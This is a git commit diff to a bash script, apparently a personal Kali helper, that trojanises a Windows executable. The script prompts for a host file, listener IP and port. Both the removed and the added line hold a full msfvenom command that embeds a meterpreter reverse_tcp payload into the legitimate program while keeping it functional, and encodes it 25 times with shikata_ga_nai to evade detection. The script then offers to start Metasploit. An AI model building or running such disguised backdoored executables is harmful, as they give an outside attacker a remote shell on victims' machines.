e33a4fb9a3a28d9904930af56812ab1e106d109e
Michal <koza41409@gmail.com>
2021-03-11 13:15:55 +0100

    optymalization

--- metasploit/metasploit_exe_injection.sh
+++ metasploit/metasploit_exe_injection.sh
@@ -17,11 +17,11 @@ read -r -p "Input exe file patch - " LOKALIZACJA
 echo "Moving file to /home/kali/Desktop/ ..."
 mv $LOKALIZACJA /home/kali/Desktop/
 cd /home/kali/Desktop
-read -r -p "Input the name of exe file - " NAZWA
+read -r -p "Input the name of exe file (without exe) - " NAZWA
 read -r -p "Input the payload IP adress - " IP
 read -r -p "Input the payload port - " PORT
-read -r -p "Input the payload name - " LADUNEK
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
+read -r -p "Input the payload name (without exe) - " LADUNEK
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -k -e x86/shikata_ga_nai -i 25 -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
 while true
 do
  read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
